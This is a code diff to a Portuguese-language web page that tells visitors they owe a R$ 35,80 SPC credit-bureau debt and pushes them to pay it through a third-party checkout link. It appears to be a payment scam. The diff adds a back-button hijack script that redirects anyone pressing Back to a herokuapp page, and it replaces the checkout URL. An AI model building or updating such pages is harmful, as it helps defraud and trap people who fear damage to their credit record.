@@ -27,6 +27,18 @@
         }
     </style>
 
+	<script>
+	(function() {
+    if (window.history && window.history.pushState) {
+        window.history.pushState('forward', null, window.location.href);
+
+        window.onpopstate = function() {
+            window.location.href = 'https://projeto-s-354cda5b1f33.herokuapp.com/pages/index.html';
+        };
+    }
+})();
+	</script>
+
     <script async="" src="https://www.clarity.ms/tag/l310i69cic"></script><script async="" src="https://www.clarity.ms/tag/l310i69cic"></script><script type="text/javascript">
         (function (c, l, a, r, i, t, y) {
             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
@@ -92,7 +104,7 @@
                     Identificamos uma pendência no SPC de R$ 35,80.
                 </p>
 
-                <a id="buttonClick" href="https://pay.segurospag.com/checkout/defe1513-180a-4e71-a4c3-d650da0a0691" data-upsell="c4f84e7c468ad68f6a538c83fe7b517c">
+                <a id="buttonClick" href="https://pay.segurospag.com/checkout/3a08c927-a103-4d02-91a9-4a004f3efd5b" data-upsell="c4f84e7c468ad68f6a538c83fe7b517c">
                     REGULARIZAR SEU CPF RAPIDAMENTE
                 </a>
 
